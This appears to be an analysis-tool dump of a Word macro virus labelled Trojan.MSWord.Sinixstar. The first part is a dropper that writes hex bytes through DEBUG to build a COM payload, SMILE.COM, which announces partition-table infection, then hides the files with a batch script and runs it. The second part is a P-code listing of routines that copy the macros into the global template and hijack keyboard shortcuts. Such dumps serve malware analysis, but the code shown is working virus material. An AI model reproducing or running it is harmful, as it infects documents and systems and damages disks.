Print #1, "E 0DB0 7C C7 39 E2 1C C7 90 E6 3C 43 99 F2 1C E7 C8 73"
Print #1, "E 0DC0 1E 61 CC 79 8F 31 E6 3C C7 88 73 8F 01 C6 3C 67"
Print #1, "E 0DD0 8C 71 8E 38 D3 1E 78 F0 1E 3C 3E 4D CF 99 E1 7C"
Print #1, "E 0DE0 7C 99 76 7E 1C C1 E6 3C 87 81 F2 3C 67 87 70 7C"
Print #1, "E 0DF0 1F 8C 70 EE 78 E3 B8 9F 8E 70 EE 39 91 E7 09 C7"
Print #1, "E 0E00 D9 86 64 6C 03 A3 F8 6E CF 88 61 C7 20 E7 3F 87"
Print #1, "E 0E10 88 F2 66 34 D9 B4 71 C6 70 E3 39 C7 04 C1 CC 73"
Print #1, "E 0E20 8E 23 0C DB 9C 76 5C CB 18 63 80 F1 3C 27 CC 39"
Print #1, "E 0E30 1F 24 C9 9D 13 E6 6C CD 9F 63 2E ED D9 33 27 CC"
Print #1, "E 0E40 1C 07 0C 78 1C 73 CE 7C 8E 33 B2 3C 39 9E 3E 63"
Print #1, "E 0E50 0C 99 D1 1C E2 8C 33 C3 18 F3 BC E6 D9 E3 90 F0"
Print #1, "E 0E60 9E 13 86 70 4F C8 F1 3F C6 E1 E7 91 E2 7E 4F 81"
Print #1, "E 0E70 F3 3C 4F 81 F0 78 1F 03 C0 F0 3E 0F C1 F0 78 1F"
Print #1, "E 0E80 03 E1 F0 3E 1F 03 E0 F0 3F 0F 03 E0 F0 3F 1F 07"
Print #1, "E 0E90 E1 F0 7E 3F 07 E1 F8 7E 1F 87 E1 DC 6E 1D E3 70"
Print #1, "E 0EA0 CF 1B 07 7C 6F 1C F1 BE 3C E3 64 4C F3 3C 47 98"
Print #1, "E 0EB0 E0 F8 3F 87 E3 F8 7E 1C 87 81 E0 F8 3F 1F 83 91"
Print #1, "E 0EC0 F0 7C 2F 0F E3 F0 7E 1F 83 E0 F8 3E 1F C6 F1 DC"
Print #1, "E 0ED0 3B 0F 31 E0 38 8F 11 C7 B9 F8 7E 1F 85 E0 F8 3E"
Print #1, "E 0EE0 3B 87 60 FC 3C 17 C5 C0 F8 3C 1F 31 C4 F1 D8 33"
Print #1, "E 0EF0 99 C3 8D 8C 8C 3E 47 66 F8 BE 3D C7 90 E2 3E 33"
Print #1, "E 0F00 81 E1 FC 3E 13 64 E6 31 8C 73 1C 03 A0 E0 3C 47"
Print #1, "E 0F10 83 E2 F8 9C 33 83 71 F8 3B 8F 89 C6 38 2E 1D C1"
Print #1, "E 0F20 F0 E6 3D C7 39 E6 38 D7 17 26 78 E6 39 C6 23 C6"
Print #1, "E 0F30 6C 8D 94 71 39 E2 39 C7 78 FE 0F 63 F8 46 C5 C8"
Print #1, "E 0F40 3B 1F E1 F8 BF 07 C3 E8 7E 1F 03 F0 FC 3D 8F E1"
Print #1, "E 0F50 CC 7F 0E 63 FC 73 8F E3 CC 77 8F 31 CE 3C C7 38"
Print #1, "E 0F60 79 8E 70 E3 8C 71 8F C7 D8 3C C7 21 F8 79 8F 01"
Print #1, "E 0F70 C6 39 C6 CC E3 9C E0 7E 1E 43 E3 38 3E 1D 8F 19"
Print #1, "E 0F80 C8 E6 1E 63 CC 71 0E 31 83 5C C5 CE 78 EE 11 C8"
Print #1, "E 0F90 79 07 19 C4 18 DE 07 00 70 62 3D 8E 63 FC 3F 0F"
Print #1, "E 0FA0 8C EC C6 73 46 4E E0 DC 33 86 70 4E 37 87 70 E6"
Print #1, "E 0FB0 38 FE 31 C3 98 7C 67 23 B6 71 85 E1 BC 0E 83 B6"
Print #1, "E 0FC0 3E 79 33 07 2C E3 19 DF 18 E4 4F C7 C0 7C 0F 00"
Print #1, "E 0FD0 E2 78 99 31 CA 1A 27 71 F0 BB 1F E1 F0 75 0C C8"
Print #1, "E 0FE0 E8 E6 33 27 8C F1 1D 19 C8 71 9B 99 3E 1E 03 A8"
Print #1, "E 0FF0 71 1E 01 C3 30 4C 7F 8E 63 1D AF 39 8E C3 F3 DC"
Print #1, "E 1000 18 8E 03 88 F8 1E 13 46 F0 7B 3B C7 78 E3 38 73"
Print #1, "E 1010 0F C7 F8 F8 1F 03 C1 D8 39 8E 71 CE 39 B1 B7 79"
Print #1, "E 1020 B9 03 F8 CE 0B 9C 73 81 9C 37 91 D8 5F 13 F1 BE"
Print #1, "E 1030 67 E3 F8 1F 8B F0 76 1F C1 D8 7F 07 71 7E 1D C7"
Print #1, "E 1040 F8 7F 0F E0 FC 3F C3 B8 FF 0C E3 FC 33 8E F0 CE"
Print #1, "E 1050 39 C3 98 73 0C E3 9C 73 8E 71 CE 38 C7 38 E3 1C"
Print #1, "E 1060 61 8C 79 C6 39 E7 1C E3 9C 73 8F 38 C7 0E 78 8F"
Print #1, "E 1070 86 78 4F 0E 78 DF 0F DE 33 E3 1D C1 FC 67 87 98"
Print #1, "E 1080 8E 0C E4 72 3B 98 CC E0 37 19 F1 9C 64 C7 39 B9"
Print #1, "E 1090 1C C7 CC 71 9F 18 C6 07 02 39 CF 0C 71 C6 38 F9"
Print #1, "E 10A0 C1 DC 73 07 03 E1 F0 1E D0 E2 1C 61 C0 38 C1 43"
Print #1, "E 10B0 33 31 8E CF 8C F0 8E 31 E3 9C 67 83 39 8E 63 E2"
Print #1, "E 10C0 3C 0F 80 F0 1E 07 91 F9 0E 01 E0 3D 83 F0 73 0E"
Print #1, "E 10D0 41 F8 79 07 A0 E6 3F C3 DC 3F 87 F0 9E 19 C3 18"
Print #1, "E 10E0 E7 18 63 9C 31 CE 73 87 39 C8 9C 67 30 71 8E 70"
Print #1, "E 10F0 C6 3B C3 18 E7 0E 71 9C 1B C4 70 E7 3D F1 DC 7F"
Print #1, "E 1100 86 71 DC 1D C7 37 7F 0F E1 FC 1F 87 F8 1F 0F E7"
Print #1, "E 1110 9C 67 0E E3 FC 33 98 3D 06 78 CF 03 F8 9E 07 F0"
Print #1, "E 1120 3E 43 E0 7C 0F E0 FC 8F C0 F1 1F 81 E2 3E 07 C0"
Print #1, "E 1130 FC 1F 81 F8 3F 07 F0 7C 0F C1 F8 3F 07 E0 FE 1F"
Print #1, "E 1140 C1 F8 3F 07 F0 FE 0F C1 FC 3F 83 F0 3F 07 E0 7E"
Print #1, "E 1150 1F C1 FC 3F 83 F8 BE 07 F1 7C 1F E3 FC 3F C3 F8"
Print #1, "E 1160 3F C7 F0 7D C7 D8 78 E3 0E 30 F8 0F 80 FC 1F C3"
Print #1, "E 1170 F8 67 03 F1 DC 07 C3 F8 7F 87 F0 7E 0F E0 FC 1F"
Print #1, "E 1180 81 F8 3F 07 F0 78 0F 80 F0 3F 0F E0 FE 1F C1 F8"
Print #1, "E 1190 1F 03 E1 F6 1F C3 DC 3F 83 F0 3F 83 E0 7E 07 E0"
Print #1, "E 11A0 FC 1F C3 FC 3E 07 F8 7C 0F B1 F8 0F 03 F0 FE 07"
Print #1, "E 11B0 80 F8 0F 01 F8 1E 07 C0 7C 0F 81 F2 3B 83 C0 74"
Print #1, "E 11C0 1E 03 E8 7E 07 E0 FE 07 C0 FC 67 03 98 F4 17 03"
Print #1, "E 11D0 E0 3C 07 C2 BC 07 81 FC 2F 07 B0 7E 0F E0 FC 19"
Print #1, "E 11E0 C2 F1 39 C7 70 70 0F 01 F8 1F 87 F0 FF 0F E1 F8"
Print #1, "E 11F0 1F 83 F8 7C 03 F0 7C 0F 81 F0 1F 03 E0 7D 07 A0"
Print #1, "E 1200 7E 0F C0 E6 1C E3 88 78 07 B0 F4 1E C1 F0 3D 07"
Print #1, "E 1210 B0 F6 0E 01 C8 1C 03 80 3C 07 86 78 4F 81 F8 7F"
Print #1, "E 1220 07 E6 78 C7 98 E1 0E 73 C0 39 C7 1C 73 07 19 FE"
Print #1, "E 1230 4E E7 3B DD C8 0F CC 9C 98 0E EC FC 88 8E EC CC"
Print #1, "E 1240 88 4C CC F9 90 19 93 72 64 76 6F 91 27 BF F9 13"
Print #1, "E 1250 F7 24 7F 98 13 FE 88 9F B0 07 FE 01 7F C0 1F FC"
Print #1, "E 1260 01 FF 80 1F E6 41 FE 00 7F D8 13 FE 01 7F 20 0F"
Print #1, "E 1270 F8 01 FF C0 1F F8 03 FE 00 FF C0 1F F8 01 FF 80"
Print #1, "E 1280 1F E0 07 FC 09 BE 60 0F EC 09 FF 00 9F B0 07 FB"
Print #1, "E 1290 02 7F 80 1F D8 0B FC 81 BF 90 0F FC 03 FF 80 3F"
Print #1, "E 12A0 E4 0D FE 00 FF F0 07 FE 01 BF C0 1F FC 01 FF 00"
Print #1, "E 12B0 7F F8 13 7F 81 3F E4 0F FE 00 3F E0 0D FE 22 37"
Print #1, "E 12C0 E4 49 FE 64 DF 7C C9 BF E0 19 B3 20 4F EC 89 FF"
Print #1, "E 12D0 C0 4F FE 00 FF C8 17 F9 20 9B 6C 82 66 4C C8 CC"
Print #1, "E 12E0 DE 04 A6 FB 13 20 1F EC 8C EC CC 6C CC 99 14 D9"
Print #1, "E 12F0 99 19 B3 20 76 F9 A6 DB 20 17 6C 92 6C C8 6F E6"
Print #1, "E 1300 46 EC C3 3F 24 47 C9 99 3B 24 DB B2 6E EC 82 5D"
Print #1, "E 1310 C2 66 F9 20 CF E4 42 7B 92 3B 33 26 99 32 DB 64"
Print #1, "E 1320 FB 99 9D 9A 64 63 36 6C C3 32 79 B6 D9 A6 7D 32"
Print #1, "E 1330 4F 36 49 B2 CC D6 6C 93 33 21 93 6C C8 9B B1 25"
Print #1, "E 1340 B3 66 03 ED 8C 9A 88 9B F6 44 FF EC 89 13 3F CC"
Print #1, "E 1350 99 BF 90 13 FE 40 4F FC 04 FF 80 3F F0 07 FF 13"
Print #1, "E 1360 77 E9 13 33 22 37 78 02 6E C9 3F DC 8B E6 62 7F"
Print #1, "E 1370 8C 66 F3 C9 9B D8 07 F3 13 7C CC 89 BE 03 F6 73"
Print #1, "E 1380 33 26 64 DB 60 3B 3E 44 9B C8 9F EC C9 B2 64 49"
Print #1, "E 1390 33 13 99 8C 9B 31 13 EC 83 7F F1 03 FC CD DE 19"
Print #1, "E 13A0 99 FF 91 3E 03 66 4C D9 1F CC 1F 99 BF 70 3F B1"
Print #1, "E 13B0 BB CC 4C 77 70 1D C4 1B F3 26 CC C7 33 36 4C 9D"
Print #1, "E 13C0 E6 4D D9 90 3F E4 4F 64 B2 64 CD 8F EC 19 93 78"
Print #1, "E 13D0 81 F8 03 FC 92 DC 84 D8 9D D9 B7 33 23 93 CD 24"
Print #1, "E 13E0 D8 19 9B 32 65 93 93 26 C4 69 32 47 C7 1C D8 73"
Print #1, "E 13F0 30 CD B3 26 D8 3C B3 61 E6 6D 93 6E 26 79 30 E3"
Print #1, "E 1400 40 CC C6 07 0E 6C 4C B8 F0 C3 EF 86 73 37 89 0F"
Print #1, "E 1410 B8 26 6C 0C 19 CC 68 F3 61 93 C7 27 98 36 7D 31"
Print #1, "E 1420 F3 B3 66 CD CC 9B 36 7E 59 3C D9 66 C3 27 83 4F"
Print #1, "E 1430 07 9C 26 79 30 70 D9 E1 9F E3 13 0C 96 43 36 4D"
Print #1, "E 1440 BC 99 3C FA 6C 9B 6C 3D C8 86 4F 2E C0 DD 03 FF"
Print #1, "E 1450 11 F0 FF F0 3E 0D FE 13 B2 DF 80 CC 27 D1 2C 99"
Print #1, "E 1460 E1 B4 1D E1 3C 3F C2 78 3F 01 F8 BC 0F 71 74 1B"
Print #1, "E 1470 07 33 CC 73 1E E6 3B 85 F1 3C 07 91 EC CE C3 B8"
Print #1, "E 1480 DE 03 89 F2 3C 8C 63 E4 F1 9F 17 44 D8 F9 0F 11"
Print #1, "E 1490 86 C7 41 7E 3F 07 D8 FE 1F E3 E8 3B 8F E2 FE 37"
Print #1, "E 14A0 87 F1 BC 65 C7 39 87 C6 70 9F 1F C3 F8 9E 47 F9"
Print #1, "E 14B0 C7 91 F0 F8 0F 67 CC 13 8D C3 38 8F 81 FC 07 A7"
Print #1, "E 14C0 F1 3D 8C E1 9C 03 88 72 1E 31 CC F0 76 30 C3 1E"
Print #1, "E 14D0 47 C0 79 17 01 F8 C6 30 EC 31 9C F1 0C 8F 82 78"
Print #1, "E 14E0 FE 0F E2 B8 FB 13 D9 FD 27 9B 62 2D 90 CC 37 9B"
Print #1, "E 14F0 71 9F 27 61 F2 BB 06 F4 C3 3C 66 D9 83 26 33 81"
Print #1, "E 1500 C4 C6 0C E0 C6 7D 64 93 C9 35 9F 63 3C 1B 61 BC"
Print #1, "E 1510 8E 37 80 F1 CC C6 6D 82 19 E5 98 79 93 31 8C 99"
Print #1, "E 1520 24 C2 73 18 C6 79 27 98 F3 37 13 C6 7E 19 C9 EC"
Print #1, "E 1530 F7 19 C4 78 8D 24 F3 2E 31 98 F2 0C C3 C7 3D 8F"
Print #1, "E 1540 88 D9 8E 67 38 CD 81 90 19 87 B9 9C 3F 98 CA 3B"
Print #1, "E 1550 87 37 89 E6 7A 6C DC 3D B8 CE 66 3E 66 1F 8E 99"
Print #1, "E 1560 E7 D3 CE E1 E7 97 69 F6 C7 F1 F9 8F C3 F6 9F 93"
Print #1, "E 1570 DF 8E D1 FB 8F E3 9D 9F 63 CF 19 C7 18 7E 8F E6"
Print #1, "E 1580 78 9E 71 DA 3F C7 F0 ED 8E 83 9F 39 E6 78 EE 3F"
Print #1, "E 1590 E3 98 E7 8E 73 1E 73 8C F9 E6 75 E3 9C FB 8C E3"
Print #1, "E 15A0 BC 77 98 F1 1A 60 CE 61 87 3D C7 9F 39 67 BC 67"
Print #1, "E 15B0 18 F1 F8 73 38 E6 06 E3 BC 73 CC 7C 1F 8D C1 D6"
Print #1, "E 15C0 73 C6 77 87 31 8E 3C C7 30 73 1C E3 9C 71 8C 71"
Print #1, "E 15D0 C6 18 C6 38 73 1A 21 CD CC 83 33 1F 0C CE 3C 33"
Print #1, "E 15E0 98 31 CE 63 C7 33 8C CD 8E 3C 33 98 E0 E4 E3 99"
Print #1, "E 15F0 31 C6 C6 E3 33 8F 0E 86 36 76 38 98 FC 63 E3 B9"
Print #1, "E 1600 CF 8F C6 67 33 8E 9C 9F 1C E0 71 B3 8C E4 CC 27"
Print #1, "E 1610 47 71 9C 64 E4 E1 A3 89 CC 9E 67 31 73 0C C1 CC"
Print #1, "E 1620 C7 8B CC CC 33 A3 1A 38 CC E1 C6 1B D3 78 FF 2E"
Print #1, "E 1630 E1 EF 1F 87 5C 6F 1B 93 9C 72 E5 93 8E 31 CC 67"
Print #1, "E 1640 8E 39 9C 98 EC 1C 83 B3 71 C6 20 EE 35 0F 1D F1"
Print #1, "E 1650 78 F7 3E 35 19 9E 30 0B 99 36 0F 1C E6 1C F1 DC"
Print #1, "E 1660 F1 CE E1 AF 1B 86 66 67 18 F9 DC 66 CC F3 33 33"
Print #1, "E 1670 8C CC A6 33 67 39 99 93 67 68 CE 79 CC 63 CC 7B"
Print #1, "E 1680 3C 19 26 33 62 DA 7B 16 46 1C DB 2C 93 4C C0 E3"
Print #1, "E 1690 C8 31 CD A4 DB 9A 66 17 36 4E 3C DA 64 D8 D2 64"
Print #1, "E 16A0 F1 E4 E7 C9 A7 39 8C 36 0F CE 33 2F 23 88 C9 99"
Print #1, "E 16B0 23 8C 73 86 3A 73 66 78 EC CC 99 A3 78 C6 33 98"
Print #1, "E 16C0 36 CC E1 93 65 C9 33 0D C1 B2 3E 4D C3 34 CF CA"
Print #1, "E 16D0 CC 78 C1 8E 6C D1 E3 1C 61 93 13 98 38 E3 8E 5C"
Print #1, "E 16E0 F0 C7 1E 30 F1 CF 19 6C 9D 6D C7 9B 1C 61 9B 27"
Print #1, "E 16F0 1C F1 CD 1E 18 E2 C7 1C 31 E1 86 38 E5 9A 6C 61"
Print #1, "E 1700 CF 3E 38 E7 0E 7C C8 36 4C E3 9C 38 E3 8F 0C 68"
Print #1, "E 1710 E7 1C B3 67 3C F9 E3 87 1C 78 E3 06 18 73 8B 38"
Print #1, "E 1720 38 C7 86 38 73 C7 3C 99 CC DE 6C F1 C3 1E 3C 31"
Print #1, "E 1730 C7 8E 18 70 E3 86 73 33 9B 1C 71 CD 86 78 F2 63"
Print #1, "E 1740 8F 1E 71 9A 2C F9 E7 96 7C 71 F1 9E 19 62 CE 5C"
Print #1, "E 1750 B3 E7 8F 38 E3 A6 0C 20 C7 30 69 93 19 9C 6C CC"
Print #1, "E 1760 1C 33 27 C6 99 B0 E0 FC D8 67 1E 47 CD 83 01 CC"
Print #1, "E 1770 D9 91 72 3C 3E 7D 3C 1F 1E 4C 9E 16 6C D9 19 B0"
Print #1, "E 1780 CC 9E 37 89 8C DC 68 E2 CC 69 F1 CC C9 E3 CC C9"
Print #1, "E 1790 E3 8C CB C3 9C CF C7 1C C7 C3 8C C7 C3 9C C7 E7"
Print #1, "E 17A0 8C C7 C3 9C CF CE 79 9F 26 39 99 8E 79 99 9C F1"
Print #1, "E 17B0 91 8C F1 B3 99 F1 B2 CC D1 83 99 E3 26 D9 CD 97"
Print #1, "E 17C0 1C C6 67 3B 19 32 4D 99 2E 79 8C 27 31 8C 33 32"
Print #1, "E 17D0 66 4C 73 C6 0C 63 9C 63 66 93 F8 CD 9C 77 8E 9C"
Print #1, "E 17E0 7E 4C 0C 6E 4D 98 EC C6 38 66 66 78 DC F3 4C CE"
Print #1, "E 17F0 64 98 C6 31 99 98 3C DF 1C BD 37 19 C6 0F 3C 72"
Print #1, "E 1800 0E 19 33 CF 32 E3 13 24 43 DF 66 C7 5C 66 83 04"
Print #1, "E 1810 64 73 7E EC D6 30 6C 4D BF CC 06 7C FD 98 20 FF"
Print #1, "E 1820 88 4E F3 80 7F F0 3B FF 00 3F FC 0F FB C0 1F FE"
Print #1, "E 1830 03 FF C0 1F FE 03 FF C0 3F FC 0F 7F 00 7F F0 03"
Print #1, "E 1840 10 07 FF F0 20 0F FB FF FF FF FF FF FF FF FF FF"
Print #1, "E 1850 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF"
Print #1, "E 1860 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF"
Print #1, "E 1870 FF FF FF FF FF FF 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 1880 4D 5A 73 00 01 00 00 00 00 00 80 00 FF FF 08 00"
Print #1, "E 1890 FE 07 00 00 1C 00 00 00 1C 00 00 00 B4 09 0E 1F"
Print #1, "E 18A0 BA 2A 00 CD 21 B8 00 4C CD 21 0D 0A 57 41 52 4E"
Print #1, "E 18B0 49 4E 47 3A 0D 0A 0D 0A 53 6D 69 6C 65 20 76 69"
Print #1, "E 18C0 72 75 73 20 68 61 73 20 6E 6F 77 20 69 6E 66 65"
Print #1, "E 18D0 63 74 65 64 20 74 68 65 20 70 61 72 74 69 74 69"
Print #1, "E 18E0 6F 6E 20 74 61 62 6C 65 20 21 21 21 21 21 0D 0A"
Print #1, "E 18F0 0D 0A 24"
Print #1, "RCX"
Print #1, "17F3"
Print #1, "W"
Print #1, "Q"
Close #1
c$ = "SMILE.COM"

Open b$ + "power.bat" For Output As #1
Print #1, "@echo off"
Print #1, "debug <" + b$ + "power.scr > nul"
Print #1, "@echo off"
Print #1, "attrib" + b$ + "power.* +h"
Print #1, "@echo off"
Print #1, b$ + c$
Close #1

Shell b$ + "power.bat", 0

SetProfileString "Installed", "Yes", c$
Else
GoTo Finish
End If

Finish:
End Sub
==============================================================================
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Trojan.MSWord.Sinixstar
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Modul 1 - 61917 bytes
' Line #0:
' 	Reparse 0x000F "Total macros: 3"
' Line #1:
' 	Reparse 0x004E "=============================================================================="
' Line #2:
' 	Reparse 0x0027 "Macro name: Sinixstar1 [SINIXSTAR1] "U""
' Line #3:
' 	Reparse 0x004E "------------------------------------------------------------------------------"
' Line #4:
' 	FuncDefn (Sub MAIN())
' Line #5:
' 	OnError Done 
' Line #6:
' Line #7:
' 	ArgsLd DateiName$ 0x0000 
' 	St a$ 
' Line #8:
' 	Ld a$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Finish 
' 	EndIf 
' Line #9:
' Line #10:
' 	Ld VInstalled 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #11:
' 	ArgsCall Run1 0x0000 
' Line #12:
' 	ArgsCall Run2 0x0000 
' Line #13:
' 	ArgsCall RunPayload 0x0000 
' Line #14:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsCall DateiAllesSpeichern 0x0002 
' Line #15:
' 	ElseBlock 
' Line #16:
' 	GoTo Done 
' Line #17:
' 	EndIfBlock 
' Line #18:
' Line #19:
' 	Label Done 
' Line #20:
' 	ArgsLd DateiName$ 0x0000 
' 	St a$ 
' Line #21:
' 	Ld a$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #22:
' 	GoTo Finish 
' Line #23:
' 	ElseBlock 
' Line #24:
' 	LitStr 0x0001 " "
' 	ArgsCall Einfügen 0x0001 
' Line #25:
' 	EndIfBlock 
' Line #26:
' Line #27:
' 	Label Finish 
' Line #28:
' 	LitStr 0x0009 "Sinixstar"
' 	LitDI2 0x0008 
' 	UMi 
' 	ArgsCall MsgBox 0x0002 
' Line #29:
' 	EndSub 
' Line #30:
' Line #31:
' 	FuncDefn (Sub Run1())
' Line #32:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St X$ 
' Line #33:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St Y$ 
' Line #34:
' Line #35:
' 	Ld X$ 
' 	Ld Y$ 
' 	Add 
' 	St Z$ 
' Line #36:
' Line #37:
' 	LitStr 0x000A "VirNameDoc"
' 	ArgsLd AbrufenDokumentVar$ 0x0001 
' 	St R1$ 
' Line #38:
' 	ArgsLd DateiName$ 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld R1$ 
' 	Add 
' 	St CO$ 
' Line #39:
' 	Ld CO$ 
' 	LitStr 0x0007 "Global:"
' 	Ld Z$ 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsCall MakroKopieren 0x0003 
' Line #40:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info2"
' 	Ld Z$ 
' 	ArgsCall SetProfileString 0x0003 
' Line #41:
' 	Reparse 0x0062 "ExtrasAnpassenTastatur.TastenSchlüssel = 65, .Kategorie = 2, .Name = Z$, .Hinzufügen, .Kontext = 0"
' Line #42:
' 	EndSub 
' Line #43:
' Line #44:
' 	FuncDefn (Sub Run2())
' Line #45:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St X$ 
' Line #46:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St Y$ 
' Line #47:
' Line #48:
' 	Ld X$ 
' 	Ld Y$ 
' 	Add 
' 	St Z$ 
' Line #49:
' Line #50:
' 	LitStr 0x0007 "VirName"
' 	ArgsLd AbrufenDokumentVar$ 0x0001 
' 	St R2$ 
' Line #51:
' 	ArgsLd DateiName$ 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld R2$ 
' 	Add 
' 	St OC$ 
' Line #52:
' 	Ld OC$ 
' 	LitStr 0x0007 "Global:"
' 	Ld Z$ 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsCall MakroKopieren 0x0003 
' Line #53:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info1"
' 	Ld Z$ 
' 	ArgsCall SetProfileString 0x0003 
' Line #54:
' 	Reparse 0x0062 "ExtrasAnpassenTastatur.TastenSchlüssel = 32, .Kategorie = 2, .Name = Z$, .Hinzufügen, .Kontext = 0"
' Line #55:
' 	EndSub 
' Line #56:
' Line #57:
' 	FuncDefn (Sub RunPayload())
' Line #58:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St X$ 
' Line #59:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St Y$ 
' Line #60:
' Line #61:
' 	Ld X$ 
' 	Ld Y$ 
' 	Add 
' 	St Z$ 
' Line #62:
' Line #63:
' 	LitStr 0x000E "VirNamePayload"
' 	ArgsLd AbrufenDokumentVar$ 0x0001 
' 	St R3$ 
' Line #64:
' 	ArgsLd DateiName$ 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld R3$ 
' 	Add 
' 	St OCO$ 
' Line #65:
' 	Ld OCO$ 
' 	LitStr 0x0007 "Global:"
' 	Ld Z$ 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsCall MakroKopieren 0x0003 
' Line #66:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info3"
' 	Ld Z$ 
' 	ArgsCall SetProfileString 0x0003 
' Line #67:
' 	EndSub 
' Line #68:
' Line #69:
' 	FuncDefn (Function VInstalled())
' Line #70:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info1"
' 	ArgsLd GetProfileString$ 0x0002 
' 	St CC$ 
' Line #71:
' 	LitDI2 0x0000 
' 	St VInstalled 
' Line #72:
' 	LitDI2 0x0000 
' 	ArgsLd ZählenMakros 0x0001 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #73:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	ArgsLd ZählenMakros 0x0001 
' 	For 
' Line #74:
' 	Ld i 
' 	LitDI2 0x0000 
' 	ArgsLd MakroName$ 0x0002 
' 	Ld CC$ 
' 	Eq 
' 	IfBlock 
' Line #75:
' 	LitDI2 0x0001 
' 	St VInstalled 
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #78:
' 	EndIfBlock 
' Line #79:
' 	EndFunc 
' Line #80:
' Line #81:
' 	FuncDefn (Function Fun(False, G, H, J))
' Line #82:
' 	LitDI2 0x0491 
' 	St One 
' Line #83:
' 	LitDI2 0x244E 
' 	St Two 
' Line #84:
' 	ArgsLd Rnd 0x0000 
' 	Ld Two 
' 	Ld One 
' 	Sub 
' 	Paren 
' 	Mul 
' 	Ld One 
' 	Add 
' 	FnInt 
' 	St Num 
' Line #85:
' 	Ld Num 
' 	ArgsLd Str$ 0x0001 
' 	St a$ 
' Line #86:
' 	Ld a$ 
' 	ArgsLd LTrim$ 0x0001 
' 	St a$ 
' Line #87:
' Line #88:
' 	Ld a$ 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St B$ 
' Line #89:
' 	Ld a$ 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St c$ 
' Line #90:
' 	Ld a$ 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St D$ 
' Line #91:
' 	Ld a$ 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St E$ 
' Line #92:
' Line #93:
' 	Ld B$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St False$ 
' 	EndIf 
' Line #94:
' 	Ld B$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St False$ 
' 	EndIf 
' Line #95:
' 	Ld B$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St False$ 
' 	EndIf 
' Line #96:
' 	Ld B$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St False$ 
' 	EndIf 
' Line #97:
' 	Ld B$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St False$ 
' 	EndIf 
' Line #98:
' 	Ld B$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St False$ 
' 	EndIf 
' Line #99:
' 	Ld B$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St False$ 
' 	EndIf 
' Line #100:
' 	Ld B$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St False$ 
' 	EndIf 
' Line #101:
' 	Ld B$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St False$ 
' 	EndIf 
' Line #102:
' 	Ld B$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St False$ 
' 	EndIf 
' Line #103:
' Line #104:
' 	Ld c$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
